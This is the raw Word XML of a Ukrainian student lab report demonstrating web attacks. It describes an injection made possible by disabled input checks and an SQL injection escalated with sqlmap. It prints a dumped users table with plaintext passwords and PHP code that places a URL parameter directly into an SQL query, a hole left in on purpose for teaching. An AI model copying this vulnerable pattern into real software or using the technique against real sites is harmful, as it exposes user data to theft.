      <w:pPr>
        <w:ind w:firstLine="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E73FAE">
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>?&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1695EB05" w14:textId="77777777" w:rsidR="00AA4A1E" w:rsidRDefault="00AA4A1E" w:rsidP="00E73FAE">
      <w:pPr>
        <w:ind w:firstLine="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1065D13F" w14:textId="2D191ABB" w:rsidR="00AA4A1E" w:rsidRDefault="00AA4A1E" w:rsidP="00AA4A1E">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorHAnsi"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorHAnsi"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t>Передбачуваний результат роботи</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15B126C0" w14:textId="63A4AD4A" w:rsidR="00AA4A1E" w:rsidRDefault="00AA4A1E" w:rsidP="00AA4A1E">
      <w:pPr>
        <w:pStyle w:val="Heading3"/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3F98DA22" wp14:editId="05FC1A30">
            <wp:extent cx="58420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16 at 7.24.2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509F" w14:textId="77777777" w:rsidR="00AA4A1E" w:rsidRDefault="00AA4A1E" w:rsidP="00AA4A1E">
      <w:pPr>
        <w:ind w:firstLine="0"/>
        <w:rPr>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1C72AB8C" w14:textId="079386CE" w:rsidR="00AA4A1E" w:rsidRDefault="00A0371E" w:rsidP="00A0371E">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">Непередбачуване виконання </w:t>
      </w:r>
      <w:r>
        <w:t>CSS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41A74A5A" w14:textId="212C890A" w:rsidR="00A0371E" w:rsidRPr="00A0371E" w:rsidRDefault="00A0371E" w:rsidP="00A0371E">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:ind w:firstLine="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4491F855" wp14:editId="0FD5E4C2">
            <wp:extent cx="5943600" cy="1685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2-16 at 7.25.1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3E4B" w14:textId="77777777" w:rsidR="00AA4A1E" w:rsidRDefault="00AA4A1E" w:rsidP="00AA4A1E">
      <w:pPr>
        <w:ind w:firstLine="0"/>
        <w:rPr>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7C9FAFF1" w14:textId="6D44CCCA" w:rsidR="00646471" w:rsidRDefault="007570A8" w:rsidP="007570A8">
      <w:pPr>
        <w:ind w:firstLine="0"/>
        <w:rPr>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve">Захист: перевірка полів форми </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t>на наявність HTML-тегів, JS-скриптів, чи будь-якого іншого виду коду, що може виконуватися на сайті.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve"> Ця перевірка реалізована в файлі </w:t>
      </w:r>
      <w:r>
        <w:t>process</w:t>
      </w:r>
      <w:r w:rsidRPr="007570A8">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:t>php</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>, але рядки з перев</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t>іркою закоментовані для демонстрації вразливості.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00913EE9" w14:textId="5F272F0F" w:rsidR="002C50AB" w:rsidRDefault="002C50AB" w:rsidP="002C50AB">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>SQL injection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D45380D" w14:textId="7DCE82E1" w:rsidR="002C50AB" w:rsidRDefault="002C50AB" w:rsidP="002C50AB">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve">Атака полягає у виконанні </w:t>
      </w:r>
      <w:r>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve"> запитів на сайті, що має базу даних (наприклад MySQL). </w:t>
      </w:r>
      <w:r w:rsidR="00C20486">
        <w:rPr>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve">В даному прикладі було було підраховано кількість стовпців в таблиці, що зберігала дані користувачів та була отримана інформація з приводу номеру стовпця, що зберігає логін користувача. Дану атаку було продовжено за допомогою </w:t>
      </w:r>
      <w:r w:rsidR="00C20486">
        <w:t>Python</w:t>
      </w:r>
      <w:r w:rsidR="00C20486">
        <w:rPr>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve">-утиліти </w:t>
      </w:r>
      <w:r w:rsidR="00C20486">
        <w:t>sqlmap</w:t>
      </w:r>
      <w:r w:rsidR="00C20486" w:rsidRPr="003954DC">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00C20486">
        <w:rPr>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t>і в результаті було отримано повний доступ до усіх баз даних, таблиць та інформації, що в них зберігається.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DA98877" w14:textId="77777777" w:rsidR="00EB489A" w:rsidRDefault="00EB489A" w:rsidP="002C50AB">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4F65ABFB" w14:textId="0843D75C" w:rsidR="003954DC" w:rsidRDefault="00EB489A" w:rsidP="00EB489A">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t>Основна інформація про базу даних та таблиці</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BE4FEDE" w14:textId="4E398D9C" w:rsidR="00EB489A" w:rsidRPr="00EB489A" w:rsidRDefault="00EB489A" w:rsidP="00EB489A">
      <w:pPr>
        <w:pStyle w:val="Heading3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База даних: </w:t>
      </w:r>
      <w:r w:rsidRPr="00EB489A">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorHAnsi" w:cs="Courier New"/>
          <w:color w:val="000000"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>c9</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C525953" w14:textId="57B51785" w:rsidR="00EB489A" w:rsidRPr="00EB489A" w:rsidRDefault="00EB489A" w:rsidP="00EB489A">
      <w:pPr>
        <w:ind w:firstLine="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">Таблиця: </w:t>
      </w:r>
      <w:r w:rsidRPr="00EB489A">
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>users</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7125F1AB" w14:textId="0B6E0BDD" w:rsidR="00EB489A" w:rsidRDefault="00EB489A" w:rsidP="00EB489A">
      <w:pPr>
        <w:ind w:firstLine="0"/>
        <w:rPr>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t>Вміст таблиці:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="520C2A05" w14:textId="77777777" w:rsidR="00EB489A" w:rsidRPr="00EB489A" w:rsidRDefault="00EB489A" w:rsidP="00EB489A">
      <w:pPr>
        <w:spacing w:line="26" w:lineRule="atLeast"/>
        <w:ind w:firstLine="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EB489A">
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>+----+-------+----------+</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37B4F0C9" w14:textId="77777777" w:rsidR="00EB489A" w:rsidRPr="00EB489A" w:rsidRDefault="00EB489A" w:rsidP="00EB489A">
      <w:pPr>
        <w:spacing w:line="26" w:lineRule="atLeast"/>
        <w:ind w:firstLine="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EB489A">
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>| id | login | password |</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3386293C" w14:textId="77777777" w:rsidR="00EB489A" w:rsidRPr="00EB489A" w:rsidRDefault="00EB489A" w:rsidP="00EB489A">
      <w:pPr>
        <w:spacing w:line="26" w:lineRule="atLeast"/>
        <w:ind w:firstLine="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EB489A">
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>+----+-------+----------+</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CE8B0F3" w14:textId="77777777" w:rsidR="00EB489A" w:rsidRPr="00EB489A" w:rsidRDefault="00EB489A" w:rsidP="00EB489A">
      <w:pPr>
        <w:spacing w:line="26" w:lineRule="atLeast"/>
        <w:ind w:firstLine="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EB489A">
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>|  1 | admin | 12345678 |</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45D91F10" w14:textId="77777777" w:rsidR="00EB489A" w:rsidRPr="00EB489A" w:rsidRDefault="00EB489A" w:rsidP="00EB489A">
      <w:pPr>
        <w:spacing w:line="26" w:lineRule="atLeast"/>
        <w:ind w:firstLine="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EB489A">
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>|  2 | misha | pass     |</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="358978E9" w14:textId="77777777" w:rsidR="00EB489A" w:rsidRPr="00EB489A" w:rsidRDefault="00EB489A" w:rsidP="00EB489A">
      <w:pPr>
        <w:spacing w:line="26" w:lineRule="atLeast"/>
        <w:ind w:firstLine="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EB489A">
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>|  3 | jack  | QweryAsd |</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11860EB2" w14:textId="0BD657EB" w:rsidR="006778D7" w:rsidRDefault="00EB489A" w:rsidP="00EB489A">
      <w:pPr>
        <w:spacing w:line="26" w:lineRule="atLeast"/>
        <w:ind w:firstLine="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EB489A">
        <w:rPr>
          <w:rFonts w:ascii="Courier" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Courier" w:cs="Courier New"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>+----+-------+----------+</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="586CBA17" w14:textId="27A578EE" w:rsidR="006778D7" w:rsidRDefault="006778D7" w:rsidP="006778D7">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorHAnsi"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorHAnsi"/>
        </w:rPr>
        <w:t>Код simple-page.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B1545EE" w14:textId="77777777" w:rsidR="006778D7" w:rsidRP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>&lt;?php include_once('connect.php'); ?&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A28C660" w14:textId="77777777" w:rsidR="006778D7" w:rsidRP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>&lt;!DOCTYPE html&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="094F4817" w14:textId="77777777" w:rsidR="006778D7" w:rsidRP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>&lt;html lang="en"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="418D4D88" w14:textId="77777777" w:rsidR="006778D7" w:rsidRP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>&lt;head&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64E43691" w14:textId="77777777" w:rsidR="006778D7" w:rsidRP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 xml:space="preserve">    &lt;meta charset="UTF-8"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="220E428D" w14:textId="77777777" w:rsidR="006778D7" w:rsidRP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 xml:space="preserve">    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="181BE7F4" w14:textId="77777777" w:rsidR="006778D7" w:rsidRP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 xml:space="preserve">    &lt;meta http-equiv="X-UA-Compatible" content="ie=edge"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="019E2F1F" w14:textId="77777777" w:rsidR="006778D7" w:rsidRP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 xml:space="preserve">    &lt;title&gt;SQL injection&lt;/title&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C826392" w14:textId="77777777" w:rsidR="006778D7" w:rsidRP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 xml:space="preserve">    </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2132B16F" w14:textId="77777777" w:rsidR="006778D7" w:rsidRP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 xml:space="preserve">    &lt;?php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30CDA2B0" w14:textId="77777777" w:rsidR="006778D7" w:rsidRP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 xml:space="preserve">        error_reporting(0);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BE71456" w14:textId="77777777" w:rsidR="006778D7" w:rsidRP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 xml:space="preserve">        $x = $_GET['id'];</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B0419FF" w14:textId="77777777" w:rsidR="006778D7" w:rsidRP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 xml:space="preserve">        $query = "SELECT * FROM users WHERE id=$x";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77661942" w14:textId="77777777" w:rsidR="006778D7" w:rsidRP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 xml:space="preserve">        $result = mysqli_query($connection, $query);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22E40013" w14:textId="77777777" w:rsidR="006778D7" w:rsidRP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 xml:space="preserve">        if (!$result) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FE39F90" w14:textId="77777777" w:rsidR="006778D7" w:rsidRP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 xml:space="preserve">            die('Query failed '.mysqli_error($connection));</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A6D15CD" w14:textId="77777777" w:rsidR="006778D7" w:rsidRP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 xml:space="preserve">        }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45EA460B" w14:textId="77777777" w:rsidR="006778D7" w:rsidRP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 xml:space="preserve">        while ($lel = mysqli_fetch_array($result)) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="478DF57A" w14:textId="77777777" w:rsidR="006778D7" w:rsidRP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 xml:space="preserve">            echo "&lt;h2&gt;&lt;pre&gt;Hello and Welcome to our site, ".$lel['login']."&lt;/pre&gt;&lt;/h2&gt;";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C0F2F39" w14:textId="77777777" w:rsidR="006778D7" w:rsidRP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 xml:space="preserve">            break;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D9378BE" w14:textId="77777777" w:rsidR="006778D7" w:rsidRP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 xml:space="preserve">        }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D8C0575" w14:textId="77777777" w:rsidR="006778D7" w:rsidRP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 xml:space="preserve">    ?&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FBA640B" w14:textId="77777777" w:rsidR="006778D7" w:rsidRP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 xml:space="preserve">    </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C9CF4A8" w14:textId="77777777" w:rsidR="006778D7" w:rsidRP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 xml:space="preserve">    &lt;?php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C6291D9" w14:textId="77777777" w:rsidR="006778D7" w:rsidRP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 xml:space="preserve">        if (!mysqli_connect_errno()) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C81E9E2" w14:textId="77777777" w:rsidR="006778D7" w:rsidRP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 xml:space="preserve">            echo " :3 ".mysqli_error($connection);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EF6317B" w14:textId="77777777" w:rsidR="006778D7" w:rsidRP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 xml:space="preserve">        }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75D5263B" w14:textId="77777777" w:rsidR="006778D7" w:rsidRP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 xml:space="preserve">    ?&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D288AAA" w14:textId="77777777" w:rsidR="006778D7" w:rsidRP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 xml:space="preserve">    </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="675C5E84" w14:textId="77777777" w:rsidR="006778D7" w:rsidRP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>&lt;/head&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DA2E816" w14:textId="77777777" w:rsidR="006778D7" w:rsidRP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>&lt;body&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DAE70AE" w14:textId="77777777" w:rsidR="006778D7" w:rsidRP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>&lt;/body&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="121D14CF" w14:textId="38259123" w:rsidR="006778D7" w:rsidRDefault="006778D7" w:rsidP="006778D7">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:ind w:firstLine="0"/>
        <w:rPr>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006778D7">
        <w:rPr>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>&lt;/html&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58A28DA0" w14:textId="77777777" w:rsidR="006361BA" w:rsidRDefault="006361BA" w:rsidP="006361BA"/>
    <w:p w14:paraId="6F20258A" w14:textId="0911C219" w:rsidR="006361BA" w:rsidRDefault="006361BA" w:rsidP="006361BA">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve">Код </w:t>
      </w:r>
      <w:r>
        <w:t>connect.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C4F4A71" w14:textId="77777777" w:rsidR="0027534C" w:rsidRPr="0027534C" w:rsidRDefault="0027534C" w:rsidP="0027534C">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:ind w:firstLine="0"/>
        <w:rPr>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0027534C">
        <w:rPr>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>&lt;?php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08E7C6B1" w14:textId="77777777" w:rsidR="0027534C" w:rsidRPr="0027534C" w:rsidRDefault="0027534C" w:rsidP="0027534C">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:ind w:firstLine="0"/>
        <w:rPr>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0027534C">
        <w:rPr>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">    //Connect to the database</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EBE2EAC" w14:textId="77777777" w:rsidR="0027534C" w:rsidRPr="0027534C" w:rsidRDefault="0027534C" w:rsidP="0027534C">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:ind w:firstLine="0"/>
        <w:rPr>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0027534C">
        <w:rPr>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">    $host = "127.0.0.1";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21114312" w14:textId="77777777" w:rsidR="0027534C" w:rsidRPr="0027534C" w:rsidRDefault="0027534C" w:rsidP="0027534C">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:ind w:firstLine="0"/>
        <w:rPr>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0027534C">
        <w:rPr>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">    $user = "kushkamisha";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E46C110" w14:textId="77777777" w:rsidR="0027534C" w:rsidRPr="0027534C" w:rsidRDefault="0027534C" w:rsidP="0027534C">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:ind w:firstLine="0"/>
        <w:rPr>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0027534C">
        <w:rPr>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">    $pass = "";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B694D24" w14:textId="77777777" w:rsidR="0027534C" w:rsidRPr="0027534C" w:rsidRDefault="0027534C" w:rsidP="0027534C">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:ind w:firstLine="0"/>
        <w:rPr>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0027534C">
        <w:rPr>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">    $db = "c9";</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41C13F1C" w14:textId="77777777" w:rsidR="0027534C" w:rsidRPr="0027534C" w:rsidRDefault="0027534C" w:rsidP="0027534C">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:ind w:firstLine="0"/>
        <w:rPr>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0027534C">
        <w:rPr>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">    $port = 3306;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D9EF7B4" w14:textId="77777777" w:rsidR="0027534C" w:rsidRPr="0027534C" w:rsidRDefault="0027534C" w:rsidP="0027534C">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:ind w:firstLine="0"/>
        <w:rPr>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0027534C">
        <w:rPr>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="469188C3" w14:textId="77777777" w:rsidR="0027534C" w:rsidRPr="0027534C" w:rsidRDefault="0027534C" w:rsidP="0027534C">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:ind w:firstLine="0"/>
        <w:rPr>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0027534C">
        <w:rPr>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">    $connection = mysqli_connect($host, $user, $pass, $db, $port)or die(mysql_error());</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="094FF6AD" w14:textId="5838688C" w:rsidR="006361BA" w:rsidRDefault="0027534C" w:rsidP="0027534C">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:ind w:firstLine="0"/>
        <w:rPr>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0027534C">
        <w:rPr>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>?&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F7E72BD" w14:textId="77777777" w:rsidR="00D60335" w:rsidRDefault="00D60335" w:rsidP="00D60335">
      <w:pPr>
        <w:ind w:firstLine="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="71049B71" w14:textId="22A589C9" w:rsidR="00D60335" w:rsidRDefault="001743F4" w:rsidP="001743F4">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t>Нормальна робота сайту</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D8C002D" w14:textId="77777777" w:rsidR="004B7EE1" w:rsidRDefault="001743F4" w:rsidP="004B7EE1">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:ind w:firstLine="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1B503D79" wp14:editId="2914FBC7">
